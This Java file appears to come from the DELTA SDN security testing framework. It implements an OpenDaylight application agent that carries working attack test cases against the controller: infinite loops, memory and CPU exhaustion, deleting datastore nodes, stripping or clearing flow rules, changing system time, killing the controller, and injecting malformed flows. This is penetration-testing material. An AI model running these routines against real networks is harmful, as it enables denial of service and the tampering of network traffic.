/**
 * Copyright (c) 2013 Cisco Systems, Inc. and others.  All rights reserved.
 * <p>
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License v1.0 which accompanies this distribution,
 * and is available at http://www.eclipse.org/legal/epl-v10.html
 */
package org.deltaproject.odlagent.core;

import com.google.common.collect.ImmutableList;
import com.google.common.collect.Lists;
import org.deltaproject.odlagent.tests.CPUex;
import com.google.common.base.Optional;
import com.google.common.util.concurrent.CheckedFuture;
import org.deltaproject.odlagent.tests.SystemTimeSet;
import org.deltaproject.odlagent.utils.*;
import org.opendaylight.controller.md.sal.binding.api.*;
import org.opendaylight.controller.md.sal.common.api.data.AsyncDataChangeEvent;
import org.opendaylight.controller.md.sal.common.api.data.LogicalDatastoreType;
import org.opendaylight.controller.md.sal.common.api.data.TransactionCommitFailedException;
import org.opendaylight.controller.sal.binding.api.NotificationService;
import org.opendaylight.yang.gen.v1.urn.ietf.params.xml.ns.yang.ietf.inet.types.rev130715.Uri;
import org.opendaylight.yang.gen.v1.urn.ietf.params.xml.ns.yang.ietf.yang.types.rev130715.MacAddress;
import org.opendaylight.yang.gen.v1.urn.opendaylight.action.types.rev131112.action.action.GroupActionCaseBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.action.types.rev131112.action.action.OutputActionCaseBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.action.types.rev131112.action.action.group.action._case.GroupActionBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.action.types.rev131112.action.action.output.action._case.OutputActionBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.action.types.rev131112.action.list.Action;
import org.opendaylight.yang.gen.v1.urn.opendaylight.action.types.rev131112.action.list.ActionBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.FlowCapableNode;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.FlowId;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.Table;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.TableKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.Flow;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.FlowBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.FlowKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.*;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.flow.update.OriginalFlowBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.flow.update.UpdatedFlowBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.statistics.rev130819.FlowStatisticsData;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.FlowRef;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.OutputPortValues;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.flow.InstructionsBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.flow.Match;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.flow.MatchBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.instruction.instruction.ApplyActionsCaseBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.instruction.instruction.apply.actions._case.ApplyActions;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.instruction.instruction.apply.actions._case.ApplyActionsBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.instruction.list.Instruction;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.instruction.list.InstructionBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.*;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.node.NodeConnectorKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.nodes.Node;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.nodes.NodeKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.l2.types.rev130827.EtherType;
import org.opendaylight.yang.gen.v1.urn.opendaylight.model.match.types.rev131026.ethernet.match.fields.EthernetTypeBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.model.match.types.rev131026.match.EthernetMatchBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.FeaturesRequest;
import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.multipart.request.MultipartRequestBody;
import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.multipart.request.multipart.request.body.MultipartRequestTableFeaturesCaseBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.openflow.protocol.rev130731.multipart.request.multipart.request.body.multipart.request.table.features._case.MultipartRequestTableFeaturesBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingListener;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingService;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketReceived;
import org.opendaylight.yang.gen.v1.urn.opendaylight.table.types.rev131026.table.features.TableFeatures;
import org.opendaylight.yang.gen.v1.urn.opendaylight.table.types.rev131026.table.features.TableFeaturesBuilder;
import org.opendaylight.yangtools.concepts.ListenerRegistration;
import org.opendaylight.yangtools.concepts.Registration;
import org.opendaylight.yangtools.yang.binding.DataObject;
import org.opendaylight.yangtools.yang.binding.InstanceIdentifier;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.ByteBuffer;
import java.util.*;
import java.util.concurrent.ExecutionException;

/**
 * AppAgentImpl
 */
public class AppAgentImpl implements PacketProcessingListener, DataChangeListener {

    private static final Logger LOG = LoggerFactory.getLogger(AppAgentImpl.class);
    private static final byte[] ETH_TYPE_IPV4 = new byte[]{0x08, 0x00};

    private NotificationService notificationService;

    private PacketProcessingService packetProcessingService;
    private DataBroker dataBroker;
    private Registration packetInRegistration;
    private SalFlowService salFlowService;
    private ListenerRegistration<DataChangeListener> dataChangeListenerRegistration;

    private Set<NodeId> nodeIdList;
    private Set<InstanceIdentifier<Node>> nodeIdentifierSet;
    private Map<NodeId, HashSet<Short>> node2table;
    private Map<MacAddress, NodeConnectorRef> mac2portMapping;

    private Interface cm;

    private boolean isDrop;
    private boolean isLoop;

    /**
     * @param notificationService the notificationService to set
     */
    // @Override
    public void setNotificationService(NotificationService notificationService) {
        this.notificationService = notificationService;
    }

    /**
     * @param packetProcessingService the packetProcessingService to set
     */
    // @Override
    public void setPacketProcessingService(
            PacketProcessingService packetProcessingService) {
        this.packetProcessingService = packetProcessingService;
    }

    /**
     * @param data the data to set
     */
    public void setDataBroker(DataBroker data) {
        this.dataBroker = data;
    }

    public void setSalFlowService(SalFlowService sal) {
        this.salFlowService = sal;
    }

    /**
     * start
     */
    public void start() {
        LOG.info("[App-Agent] AppAgentImpl start() passing");

        nodeIdList = new HashSet<>();
        node2table = new HashMap<>();
        mac2portMapping = new HashMap<>();
        nodeIdentifierSet = new HashSet<>();

        packetInRegistration = notificationService.registerNotificationListener(this);
        dataChangeListenerRegistration = dataBroker.registerDataChangeListener(LogicalDatastoreType.OPERATIONAL,
                InstanceIdentifier.builder(Nodes.class)
                        .child(Node.class)
                        .augmentation(FlowCapableNode.class)
                        .child(Table.class).build(),
                this,
                DataBroker.DataChangeScope.SUBTREE);

        // testMalformedFlodRuleGen();

        cm = new Interface();
        cm.setAgent(this);
        cm.connectServer("AppAgent");
        cm.start();

    }

    /**
     * stop
     */
    public void stop() {
        LOG.info("stop() -->");
        //TODO: remove flow (created in #start())
        try {
            packetInRegistration.close();
        } catch (Exception e) {
            LOG.warn("Error unregistering packet in listener: {}", e.getMessage());
            LOG.debug("Error unregistering packet in listener.. ", e);
        }
        try {
            dataChangeListenerRegistration.close();
        } catch (Exception e) {
            LOG.warn("Error unregistering data change listener: {}", e.getMessage());
            LOG.debug("Error unregistering data change listener.. ", e);
        }
        LOG.info("stop() <--");
    }

    public CheckedFuture<Void, TransactionCommitFailedException> writeFlowToConfig(InstanceIdentifier<Flow> flowPath, Flow flowBody) {
        ReadWriteTransaction addFlowTransaction = dataBroker.newReadWriteTransaction();
        addFlowTransaction.put(LogicalDatastoreType.CONFIGURATION, flowPath, flowBody, true);
        return addFlowTransaction.submit();
    }

    @Override
    public void onDataChanged(AsyncDataChangeEvent<InstanceIdentifier<?>, DataObject> change) {

        // TODO add flow
        Map<InstanceIdentifier<?>, DataObject> updated = change.getUpdatedData();
        for (Map.Entry<InstanceIdentifier<?>, DataObject> updateItem : updated.entrySet()) {
            DataObject object = updateItem.getValue();

            if (object instanceof Table) {
                /*
                 * appearedTablePath is in form of /nodes/node/node-id/table/table-id
                 * so we shorten it to /nodes/node/node-id to get identifier of switch.
                 */

                InstanceIdentifier<Table> tablePath = (InstanceIdentifier<Table>) updateItem.getKey();
                InstanceIdentifier<Node> nodePath = InstanceIdentifierUtils.getNodePath(tablePath);
                nodeIdentifierSet.add(nodePath);

                Table tableSure = (Table) object;
                Short tid = tableSure.getId();

                NodeId nodeId = nodePath.firstKeyOf(Node.class, NodeKey.class).getId();
                nodeIdList.add(nodeId);

                if (node2table.containsKey(nodeId)) {
                    node2table.get(nodeId).add(tid);
                } else {
                    HashSet<Short> set = new HashSet<>();
                    set.add(tid);
                    node2table.put(nodeId, set);
                }
                //LOG.info("[App-Agent] nodeIdList: {}, node2table: {}", nodeIdList, node2table);
            } else {
                //LOG.info("[App-Agent] object class: {}", object.getClass().toString());
            }
        }
    }

    @Override
    public void onPacketReceived(PacketReceived notification) {
        // LOG.info("[App-Agent] onPacketReceived() " + notification.toString());

        /**
         * Notification contains reference to ingress port
         * in a form of path in inventory: /nodes/node/node-connector
         *
         * In order to get path we shorten path to the first node reference
         * by using firstIdentifierOf helper method provided by InstanceIdentifier,
         * this will effectively shorten the path to /nodes/node.
         *
         */
        InstanceIdentifier<?> ingressPort = notification.getIngress().getValue();
        InstanceIdentifier<Node> nodeOfPacket = ingressPort.firstIdentifierOf(Node.class);

        // read src MAC and dst MAC
        byte[] dstMacRaw = PacketUtils.extractDstMac(notification.getPayload());
        byte[] srcMacRaw = PacketUtils.extractSrcMac(notification.getPayload());
        byte[] etherType = PacketUtils.extractEtherType(notification.getPayload());

        if (Arrays.equals(ETH_TYPE_IPV4, etherType)) {
            MacAddress dstMac = PacketUtils.rawMacToMac(dstMacRaw);
            String dstMacStr = PacketUtils.rawMacToString(dstMacRaw);
            MacAddress srcMac = PacketUtils.rawMacToMac(srcMacRaw);

            NodeConnectorKey ingressKey = InstanceIdentifierUtils.getNodeConnectorKey(notification.getIngress().getValue());
            NodeConnectorId connectorId = ingressKey.getId();

            LOG.info("[App-Agent] " + connectorId.getValue());
            LOG.info("[App-Agent] Received packet from MAC match: {}, ingress: {}", srcMac, ingressKey.getId());
            LOG.info("[App-Agent] Received packet to   MAC match: {}", dstMac);
            LOG.info("[App-Agent] Ethertype: {}", Integer.toHexString(0x0000ffff & ByteBuffer.wrap(etherType).getShort()));

            mac2portMapping.put(srcMac, notification.getIngress());
            NodeConnectorRef destNodeConnector = mac2portMapping.get(dstMac);

            if (destNodeConnector != null && !destNodeConnector.equals(notification.getIngress())) {
                // LOG.info(connectorId.toString() + "->" + destNodeConnector);
                InstanceIdentifier<Table> tablePath = null;
                for (NodeId id : node2table.keySet()) {
                    if (connectorId.toString().contains(id.getValue())) {

                    }
                }

                NodeId ingressNodeId = InventoryUtils.getNodeId(notification.getIngress());
                FlowUtils.programL2Flow(dataBroker, ingressNodeId, dstMacStr, connectorId, InventoryUtils.getNodeConnectorId(destNodeConnector));
            }
        }
    }

    public void test1() {
        LOG.info("[App-Agent] test1() ");

        for (NodeId id : nodeIdList) {
            HashSet<Short> tables = node2table.get(id);
//            InstanceIdentifier<Node> node =
//                    InstanceIdentifier
//                            .create(Nodes.class)
//                            .child(Node.class,
//                                    new NodeKey(new NodeId("openflow:1")));
            // FlowUtils.programL2Flow(this.dataBroker, id);
        }
//        FlowUtils.programL2Flow(this.dataBroker, new NodeId("openflow:1"));
        sendFlowRuleAddPkt();
    }

    public void test2() {
        LOG.info("[App-Agent] test2()");

        InstanceIdentifier.InstanceIdentifierBuilder<Nodes> nodesInsIdBuilder = InstanceIdentifier
                .<Nodes>builder(Nodes.class);
        Nodes nodes = null;

        try (ReadOnlyTransaction readOnlyTransaction = dataBroker.newReadOnlyTransaction()) {
            Optional<Nodes> dataObjectOptional = readOnlyTransaction
                    .read(LogicalDatastoreType.OPERATIONAL, nodesInsIdBuilder.build()).get();

            if (dataObjectOptional.isPresent()) {
                nodes = dataObjectOptional.get();

                if (nodes != null) {
                    for (Node node : nodes.getNode()) {
                        LOG.info("[App-Agent] node: {}", node.getId());
                    }
                }
            }
        } catch (InterruptedException e) {
            LOG.error("Failed to read nodes from Operation data store.");
            throw new RuntimeException("Failed to read nodes from Operation data store.", e);
        } catch (ExecutionException e) {
            LOG.error("Failed to read nodes from Operation data store.");
            throw new RuntimeException("Failed to read nodes from Operation data store.", e);
        }
    }


    public void setControlMessageDrop() {
        this.isDrop = true;
    }

    public void setInfiniteLoop() {
        this.isLoop = true;
    }

    public void sendFlowRuleAddPkt() {
        LOG.info("[App-Agent] sendFlowRuleAddPkt()");

        // Create match
        MatchBuilder match = new MatchBuilder();
        match.setInPort(InventoryUtils.getNodeConnectorId(new NodeId("openflow:1"), (long) 1));

        // Create action
                /*
                Action groupAction = new ActionBuilder()
                        .setOrder(0)
                        .setAction(new GroupActionCaseBuilder()
                                .setGroupAction(new GroupActionBuilder()
                                        .setGroupId((long) 1)
                                        .build())
                                .build())
                        .build();*/

        Action groupAction = new ActionBuilder()
                .setOrder(0)
                .setAction(new OutputActionCaseBuilder()
                        .setOutputAction(new OutputActionBuilder()
                                .setMaxLength(Integer.valueOf(0xffff))
                                .setOutputNodeConnector(InventoryUtils.getNodeConnectorId(new NodeId("openflow:1"), 2))
                                .build())
                        .build())
                .build();

        ApplyActions applyActions = new ApplyActionsBuilder()
                .setAction(ImmutableList.of(groupAction))
                .build();

        // Wrap our Apply Action in an Instruction
        Instruction applyActionsInstruction = new InstructionBuilder()
                .setOrder(0)
                .setInstruction(new ApplyActionsCaseBuilder()
                        .setApplyActions(applyActions)
                        .build())
                .build();

        LOG.info("[App-Agent] before");

        final AddFlowInputBuilder builder = new AddFlowInputBuilder();
        builder.setNode(InventoryUtils.getNodeRef(new NodeId("openflow:1")));
        builder.setPriority(777);
        builder.setTableId((short) 0);
        builder.setMatch(match.build());
        builder.setInstructions(new InstructionsBuilder()
                .setInstruction(ImmutableList.of(applyActionsInstruction))
                .build());

        LOG.info("[App-Agent] builder {}", builder);

        if (salFlowService == null)
            LOG.info("[App-Agent] salFlowService is NULL");
        else {
            AddFlowInput addflow = builder.build();
            salFlowService.addFlow(addflow);
            LOG.info("[App-Agent] send add flow: {}", addflow);
        }
    }

    /*
     * 3.1.030: Infinite Loops
     */
    public void testInfiniteLoop() {
        int i = 0;
        LOG.info("[App-Agent] Infinite Loop");

        while (true) {
            i++;

            if (i == 10)
                i = 0;
        }
    }

    /*
     * 3.1.040: Internal Storage Abuse
     */
    public String testInternalStorageAbuse() {
        LOG.info("[App-Agent] Internal Storage Abuse");
        String removed = "";

        for (InstanceIdentifier<Node> node : nodeIdentifierSet) {
            WriteTransaction wt = dataBroker.newWriteOnlyTransaction();
            wt.delete(LogicalDatastoreType.OPERATIONAL, node);
            CheckedFuture<Void, TransactionCommitFailedException> commitFuture = wt.submit();

            try {
                commitFuture.checkedGet();
                LOG.info("[App-Agent] Transaction success for REMOVE of object {}", node);
                removed += node.toString() + ", ";
            } catch (TransactionCommitFailedException e) {
                e.printStackTrace();
            }
        }

        return removed;
    }

    /*
     * 3.1.070: Flow Rule Modification
     */
    public String testFlowRuleModification() {
        LOG.info("[App-Agent] Flow Rule Modification!");

        String modified = "null";

        int flowCount = 0;
        int flowStatsCount = 0;

        for (NodeId nodeId : nodeIdList) {
            NodeKey nodeKey = new NodeKey(nodeId);

            InstanceIdentifier<FlowCapableNode> nodeRef = InstanceIdentifier
                    .create(Nodes.class).child(Node.class, nodeKey)
                    .augmentation(FlowCapableNode.class);

            ReadOnlyTransaction readOnlyTransaction = dataBroker.newReadOnlyTransaction();
            FlowCapableNode node = TestProviderTransactionUtil.getDataObject(
                    readOnlyTransaction, nodeRef);

            if (node != null) {
                List<Table> tables = node.getTable();

                for (Iterator<Table> iterator2 = tables.iterator(); iterator2.hasNext(); ) {
                    TableKey tableKey = iterator2.next().getKey();

                    InstanceIdentifier<Table> tableRef = InstanceIdentifier
                            .create(Nodes.class).child(Node.class, nodeKey)
                            .augmentation(FlowCapableNode.class).child(Table.class, tableKey);

                    Table table = TestProviderTransactionUtil.getDataObject(
                            readOnlyTransaction, tableRef);

                    if (table != null) {
                        if (table.getFlow() != null) {
                            List<Flow> flows = table.getFlow();

                            for (Flow origin : flows) {
                                //LOG.info("[App-Agent] flow : " + origin.toString());

                                FlowKey flowKey = origin.getKey();
                                InstanceIdentifier<Flow> flowRef = InstanceIdentifier
                                        .create(Nodes.class).child(Node.class, nodeKey)
                                        .augmentation(FlowCapableNode.class)
                                        .child(Table.class, tableKey)
                                        .child(Flow.class, flowKey);

                                UpdatedFlowBuilder updatedFlow = new UpdatedFlowBuilder();
                                updatedFlow.setTableId(table.getId());
                                updatedFlow.setMatch(origin.getMatch());
                                updatedFlow.setInstructions(null);

                                final UpdateFlowInputBuilder builder = new UpdateFlowInputBuilder();
                                builder.setNode(InventoryUtils.getNodeRef(nodeId));
                                builder.setFlowRef(new FlowRef(flowRef));
                                builder.setOriginalFlow(new OriginalFlowBuilder(origin).setStrict(Boolean.TRUE).build());
                                builder.setUpdatedFlow(new UpdatedFlowBuilder(updatedFlow.build()).setStrict(Boolean.TRUE).build());

                                if (salFlowService == null)
                                    LOG.info("[App-Agent] salFlowService is NULL");
                                else {
                                    salFlowService.updateFlow(builder.build());
                                }

                                flowCount++;
                            }
                        }
                    }
                }
            }
        }

        return modified;
    }

    /*
     * 3.1.080: Flow Table Clearance
     */
    public String testFlowTableClearance(boolean infinite) {
        LOG.info("[App-Agent] Flow Table Clearance, one time?: {}", !infinite);

        String modified = "";

        int cnt = 0;
        while (cnt != 100) {
            for (NodeId id : nodeIdList) {
                HashSet<Short> tables = node2table.get(id);

                LOG.info("[App-Agent] node: {}, table size: {} ", id, tables.size());

                for (Short tableId : tables) {
                    RemoveFlowInputBuilder flowBuilder = new RemoveFlowInputBuilder()
                            .setTableId(tableId)
                            .setBarrier(false)
                            .setNode(InventoryUtils.getNodeRef(id));

                    if (salFlowService == null)
                        LOG.info("[App-Agent] salFlowService is NULL");
                    else {
                        RemoveFlowInput remove = flowBuilder.build();
                        salFlowService.removeFlow(remove);
                    }
                }
            }
            cnt++;

            if (!infinite)
                break;
        }

        return modified;
    }

    /*
     * 3.1.110: Memory Exhaustion
     */
    public void testResourceExhaustionMem() {
        LOG.info("[App-Agent] Resource Exhausion : Mem");

        ArrayList<long[][]> arry;
        arry = new ArrayList<long[][]>();

        while (true) {
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
        }
    }

    /*
     * 3.1.120: CPU Exhaustion
     */
    public void testResourceExhaustionCPU() {
        LOG.info("[App-Agent] Resource Exhausion : CPU");
        int thread_count = 0;

        for (int count = 0; count < 1000; count++) {
            CPUex cpu_thread = new CPUex();
            cpu_thread.start();
            thread_count++;

            LOG.info("[AppAgent] Resource Exhausion : Thread "
                    + thread_count);
        }
    }

    /*
     * 3.1.130: System Variable Manipulation
     */
    public boolean testSystemVariableManipulation() {
        LOG.info("[App-Agent] System Variable Manipulation");

        SystemTimeSet systime = new SystemTimeSet();
        systime.start();
        return true;
    }

    /*
     * 3.1.140: System Command Execution
     */
    public void testSystemCommandExecution() {
        LOG.info("[AppAgent] System Command Execution : EXIT Controller");
        System.exit(0);
    }

    /*
     * 2.1.060:
     */
    public String sendUnFlaggedFlowRemoveMsg(String cmd, long ruleId) {

        LOG.info("[App Agent] Call sendUnflaggedFlowRemoveMsg");

        ReadOnlyTransaction readOnlyTransaction = null;
        try {
            Nodes nodes = null;
            InstanceIdentifier.InstanceIdentifierBuilder<Nodes> nodesInsIdBuilder = InstanceIdentifier
                    .builder(Nodes.class);
            readOnlyTransaction = dataBroker.newReadOnlyTransaction();
            Optional<Nodes> dataObjectOptional = null;
            dataObjectOptional = readOnlyTransaction
                    .read(LogicalDatastoreType.OPERATIONAL, nodesInsIdBuilder.build()).get();
            if (dataObjectOptional.isPresent()) {
                nodes = dataObjectOptional.get();
            }

            readOnlyTransaction.close();

            assert nodes != null;
            NodeKey nodeKey = new NodeKey(nodes.getNode().get(0).getId());

            InstanceIdentifier<FlowCapableNode> nodeRef = InstanceIdentifier
                    .create(Nodes.class).child(Node.class, nodeKey)
                    .augmentation(FlowCapableNode.class);

            readOnlyTransaction = dataBroker.newReadOnlyTransaction();
            FlowCapableNode flowCapableNode = TestProviderTransactionUtil.getDataObject(
                    readOnlyTransaction, nodeRef);
            readOnlyTransaction.close();

            assert flowCapableNode != null;
            Table table = flowCapableNode.getTable().get(0);

            if (cmd.contains("install")) {

                FlowBuilder flowBuilder = new FlowBuilder()
                        .setTableId(table.getId())
                        .setFlowName("unflagged");

                Match match = new MatchBuilder()
                        .setInPort(NodeConnectorId.getDefaultInstance("1"))
                        .setEthernetMatch(
                                new EthernetMatchBuilder().setEthernetType(
                                        new EthernetTypeBuilder().setType(
                                                new EtherType(2048L))
                                                .build())
                                        .build())
                        .build();

                Flow flow = flowBuilder
                        .setId(new FlowId(Long.toString(flowBuilder.hashCode())))
                        .setPriority(555)
                        .setMatch(match)
                        .build();

                InstanceIdentifier<Node> nodeInstanceId = InstanceIdentifier.builder(Nodes.class)
                        .child(Node.class, nodeKey).build();

                InstanceIdentifier<Table> tableInstanceId = nodeInstanceId
                        .augmentation(FlowCapableNode.class)
                        .child(Table.class, new TableKey(table.getId()));

                final AddFlowInputBuilder builder = new AddFlowInputBuilder(flow).setNode(new NodeRef(nodeInstanceId))
                        .setFlowTable(new FlowTableRef(tableInstanceId))
                        .setTransactionUri(new Uri("9999"));

                salFlowService.addFlow(builder.build());

                LOG.info("Install a flow {} to the device {}", flow, nodeKey.getId());
                String result = "Installed flow rule id|" + flow.getId().getValue();

                return result;

            } else if (cmd.contains("check")) {

                Boolean result = true;

                for (Flow flow : table.getFlow()) {
                    if (Long.parseLong(flow.getId().getValue()) == ruleId) {
                        result = false;
                    }
                }

                if (result) {
                    return "success";
                } else {
                    return "fail";
                }
            }
        } catch (Exception e) {
            LOG.error(e.toString());
        }

        return "fail";
    }

    /*
     * 3.1.250: TableFeaturesReplyAmplification
     */
    public String testTableFeaturesReplyAmplification() {
        LOG.info("[App-Agent] Table Features Request Amplification attack");

        String modified = "";

        for (NodeId id : nodeIdList) {
            HashSet<Short> tables = node2table.get(id);

            LOG.info("[App-Agent] node: {}, table size: {} ", id, tables.size());

            for (Short tableId : tables) {
                MultipartRequestTableFeaturesCaseBuilder tableFeaturesCaseBuilder = new MultipartRequestTableFeaturesCaseBuilder();
                tableFeaturesCaseBuilder.setMultipartRequestTableFeatures(new MultipartRequestTableFeaturesBuilder().build());
                MultipartRequestBody body = tableFeaturesCaseBuilder.build();

                WriteTransaction wt = dataBroker.newWriteOnlyTransaction();

            }
        }


        return modified;
    }

    /*
     * 3.1.260: MalformedFlodRuleGen
     */
    public String testMalformedFlodRuleGen() {
        LOG.info("[App-Agent] Malformed Flow Rule Generation attack");

        // Create match
        MatchBuilder match = new MatchBuilder();
        match.setInPort(InventoryUtils.getNodeConnectorId(new NodeId("openflow:1"), (long) 1));

        // Create action
                /*
                Action groupAction = new ActionBuilder()
                        .setOrder(0)
                        .setAction(new GroupActionCaseBuilder()
                                .setGroupAction(new GroupActionBuilder()
                                        .setGroupId((long) 1)
                                        .build())
                                .build())
                        .build();*/

        Action groupAction = new ActionBuilder()
                .setOrder(0)
                .setAction(new GroupActionCaseBuilder()
                        .setGroupAction(new GroupActionBuilder()
                                .build())
                        .build())
                .build();

        ApplyActions applyActions = new ApplyActionsBuilder()
                .setAction(ImmutableList.of(groupAction))
                .build();

        // Wrap our Apply Action in an Instruction
        Instruction applyActionsInstruction = new InstructionBuilder()
                .setOrder(0)
                .setInstruction(new ApplyActionsCaseBuilder()
                        .setApplyActions(applyActions)
                        .build())
                .build();

        FlowKey flowKey = new FlowKey(new FlowId("delta"));

        //final AddFlowInputBuilder builder = new AddFlowInputBuilder();
        FlowBuilder builder = new FlowBuilder();

        builder.setTableId((short) 0);
        builder.setPriority(1);
        builder.setMatch(match.build());
        builder.setInstructions(new InstructionsBuilder()
                .setInstruction(ImmutableList.of(applyActionsInstruction))
                .build());
        builder.setKey(flowKey);

        Flow flow = builder.build();

        InstanceIdentifier<Flow> flowIID = InstanceIdentifier.builder(Nodes.class)
                .child(Node.class, new NodeKey(new NodeId("openflow:1")))
                .augmentation(FlowCapableNode.class)
                .child(Table.class, new TableKey(builder.getTableId()))
                .child(Flow.class, builder.getKey())
                .build();

        GenericTransactionUtils.writeData(dataBroker, LogicalDatastoreType.CONFIGURATION, flowIID, builder.build(), true);

        LOG.info("[App-Agent] flow rule {} ", flow.toString());
        return "";
    }

}